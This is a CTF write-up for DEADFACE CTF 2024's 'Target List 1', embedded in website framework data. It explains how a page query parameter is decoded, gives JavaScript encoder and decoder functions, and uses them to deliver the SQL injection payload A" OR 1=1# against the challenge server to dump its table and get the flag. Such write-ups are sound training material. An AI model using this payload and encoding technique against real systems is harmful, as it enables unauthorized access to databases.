home\"}],[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}]]}],{\"children\":[[\"id\",\"7420e657c833bbe586c56a77aabf223d\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L5\",[\"$\",\"$L6\",null,{\"children\":\"$L7\"}],null,[\"$\",\"$L8\",null,{\"children\":[\"$L9\",\"$La\",[\"$\",\"$Lb\",null,{\"promise\":\"$@c\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"gUPgCZU17EF9W8q9ji8T-\",{\"children\":[[\"$\",\"$Ld\",null,{\"children\":\"$Le\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],null]}],false]],\"m\":\"$undefined\",\"G\":[\"$f\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"10:\"$Sreact.suspense\"\n11:I[74911,[],\"AsyncMetadata\"]\n7:[\"$\",\"$10\",null,{\"fallback\":null,\"children\":[\"$\",\"$L11\",null,{\"promise\":\"$@12\"}]}]\n"])</script><script>self.__next_f.push([1,"a:null\n"])</script><script>self.__next_f.push([1,"e:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n9:null\n"])</script><script>self.__next_f.push([1,"12:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"kevin.fish\"}]],\"error\":null,\"digest\":\"$undefined\"}\nc:{\"metadata\":\"$12:metadata\",\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"13:I[50674,[\"325\",\"static/chunks/325-8cc74193b249521f.js\",\"134\",\"static/chunks/app/writeups/%5Bid%5D/page-b6fc1eb85fdc5690.js\"],\"default\"]\n"])</script><script>self.__next_f.push([1,"5:[\"$\",\"div\",null,{\"children\":[\"$\",\"main\",null,{\"className\":\"max-w-5xl mx-auto text-sm [\u0026_h1]:text-5xl [\u0026_h1]:font-semibold [\u0026_h1]:mb-8 [\u0026_blockquote]:text-secondary [\u0026_blockquote]:space-y-3 [\u0026_blockquote]:border-l-4 [\u0026_blockquote]:border-secondary [\u0026_blockquote]:pl-5 [\u0026_blockquote]:mb-5 [\u0026\u003e_p]:my-3 [\u0026_img]:my-5 [\u0026_ul]:list-disc [\u0026_ul]:pl-6 [\u0026_img]:rounded [\u0026_li]:my-2\",\"children\":[[\"$\",\"h1\",\"h1-0\",{\"children\":\"DEADFACE CTF 2024 — Target List 1\"}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-0\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide.\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":\"http://targetlist.deadface.io:3001\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"We're given a simple website that looks like this:\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/78996e6e-b389-411c-aca3-a846a4b04c9c\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-2\",{\"children\":\"On each \\\"page\\\", we can find records that begin with \\\"A\\\", \\\"B\\\", and \\\"C\\\":\"}],\"\\n\",[\"$\",\"p\",\"p-3\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/297c9f02-ad97-4b6e-8182-95af781296e2\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-4\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/5700b3b3-7120-44d6-b07b-cfbf08e619d4\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-5\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/821a70ec-83b1-47ae-be64-f32d08203cf4\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-6\",{\"children\":\"At first, it looks like we get to query users that start with\"}],\"\\n\",[\"$\",\"$L13\",\"pre-0\",{\"className\":\"my-4\",\"children\":\"String.fromCharCode(64 + page)\",\"language\":\"js\"}],\"\\n\",[\"$\",\"p\",\"p-7\",{\"children\":[\"where \",[\"$\",\"code\",\"code-0\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"page\"}],\" is the integer query parameter passed to the page.\"]}],\"\\n\",[\"$\",\"p\",\"p-8\",{\"children\":[\"If we manually edit the \",[\"$\",\"code\",\"code-0\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"\u0026page=\"}],\" query parameter to go to page 4, it looks like we can query users beginning with \\\"D\\\" as expected.\"]}],\"\\n\",[\"$\",\"p\",\"p-9\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/d714b8c5-e9fa-4ef2-9a7b-4151402b89e8\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-10\",{\"children\":\"Similarly, we can query users with \\\"I\\\" on page 9, but somehow the query changes to \\\"II\\\" on page 99, \\\"IÙ\\\" on page 999, and \\\"IÙI\\\" on page 9999:\"}],\"\\n\",[\"$\",\"p\",\"p-11\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/440879e4-f67c-4a08-b499-62a64b494298\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-12\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/ae6f04f8-b99a-4520-bbb9-0f530a128542\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-13\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/a8216a9e-5c2a-4b0d-9a30-00c2b40a0caa\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-14\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/a47e53ce-cbaf-4569-be74-588d45464645\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-15\",{\"children\":[\"so it looks like our input gets grouped into pairs when parsed. Furthermore, if we go to page \",[\"$\",\"code\",\"code-0\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"f\"}],\", we end up querying users starting with \\\"O\\\"; 'A' + 15.\"]}],\"\\n\",[\"$\",\"p\",\"p-16\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/226005a9-c14c-4afd-bf96-f23f2e7d7bae\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-17\",{\"children\":\"With this, we get a pretty clear picture of how our query parameter is parsed: a 0 is appended to the input, then the page number is interpreted as hex bytes (where 64 is added to each byte so 1 maps to \\\"A\\\"). Then, we can guess our input is handled something like so:\"}],\"\\n\",[\"$\",\"$L13\",\"pre-1\",{\"className\":\"my-4\",\"children\":\"function conv(s) {\\n    const chars = ('0' + s).split('');\\n    let ret = '';\\n\\n    for (let i = 0; i \u003c chars.length; i += 2) {\\n        let byte = chars[i];\\n        if (i + 1 \u003c chars.length) byte += chars[i + 1];\\n\\n        let num = 64 + parseInt(byte, 16);\\n        ret += String.fromCharCode(num);\\n    }\\n\\n    return ret;\\n}\",\"language\":\"js\"}],\"\\n\",[\"$\",\"p\",\"p-18\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/a2d3d6ab-582c-485c-83a7-c6de6f5f92f5\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-19\",{\"children\":[\"But then, when we go to page \",[\"$\",\"code\",\"code-0\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"162\"}],\",\"]}],\"\\n\",[\"$\",\"p\",\"p-20\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/1fd3dbe0-5dc9-4306-96d0-a9ace24af4d6\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-21\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/3d1651db-960f-4ba6-b3b5-1cda3f7083c4\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-22\",{\"children\":[\"Why would the cent character cause things to fail? If we go to page \",[\"$\",\"code\",\"code-0\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"163\"}],\", something's not right; we get \\\"#\\\" instead of \\\"£\\\" as expected:\"]}],\"\\n\",[\"$\",\"p\",\"p-23\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/6274445e-4609-4097-a385-6ba62a32d93c\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-24\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/051a1590-d119-4c4c-a1c7-8635c93b7d06\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-25\",{\"children\":[\"Then, there must be a narrow range of characters where our bytes \",[\"$\",\"em\",\"em-0\",{\"children\":\"are\"}],\" subtracted by 128 allowing us to get a wider range of characters. To simplify things, we can assume this range applies to everything above 128 (not true for page \",[\"$\",\"code\",\"code-0\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"999\"}],\" seen earlier, but the discrepancy is ultimately unimportant to solve the challenge):\"]}],\"\\n\",[\"$\",\"$L13\",\"pre-2\",{\"className\":\"my-4\",\"children\":\"function conv(s) {\\n    const rest = ('0' + s).split('');\\n    let ret = '';\\n\\n    for (let i = 0; i \u003c rest.length; i += 2) {\\n        let group = rest[i];\\n        if (i + 1 \u003c rest.length) group += rest[i + 1];\\n\\n        let num = 64 + parseInt(group, 16);\\n        if (num \u003e 128) num -= 128;\\n        ret += String.fromCharCode(num);\\n    }\\n\\n    return ret;\\n}\",\"language\":\"js\"}],\"\\n\",[\"$\",\"p\",\"p-26\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/d6bb46cd-8222-4f6f-afff-93c48812a301\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-27\",{\"children\":[\"So our input was actually failing on double quotes... could that imply it was being passed to a database as an SQL query? Based on the updated \",[\"$\",\"code\",\"code-0\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"conv()\"}],\" function, we can write a simple \",[\"$\",\"code\",\"code-1\",{\"className\":\"text-primary bg-black/20 rounded p-1\",\"children\":\"deconv()\"}],\" function to reverse desired strings to query param bytes:\"]}],\"\\n\",[\"$\",\"$L13\",\"pre-3\",{\"className\":\"my-4\",\"children\":\"function deconv(s) {\\n    let ret = '1';\\n    for (const c of s) {\\n        let diff = c.charCodeAt(0) - 64;\\n        if (diff \u003c 0) diff += 128;\\n\\n        let str = diff.toString(16);\\n        if (str.length \u003c 2) str = '0' + str;\\n        ret += str;\\n    }\\n    return ret;\\n}\",\"language\":\"js\"}],\"\\n\",[\"$\",\"p\",\"p-28\",{\"children\":\"Then, we can run\"}],\"\\n\",[\"$\",\"p\",\"p-29\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/2d0e6150-06a5-48e4-a625-29bcab02ae98\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-30\",{\"children\":\"to encode\"}],\"\\n\",[\"$\",\"$L13\",\"pre-4\",{\"className\":\"my-4\",\"children\":\"A\\\" OR 1=1#\",\"language\":\"$undefined\"}],\"\\n\",[\"$\",\"p\",\"p-31\",{\"children\":\"list the entire table, and get the flag:\"}],\"\\n\",[\"$\",\"p\",\"p-32\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/6fd6e365-5101-48c7-90fe-72eb59159cbd\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"$L13\",\"pre-5\",{\"className\":\"my-4\",\"children\":\"flag{SQL-1nj3ct10n-thrU-x0r}\",\"language\":\"$undefined\"}]]}]}]\n"])</script></body></html>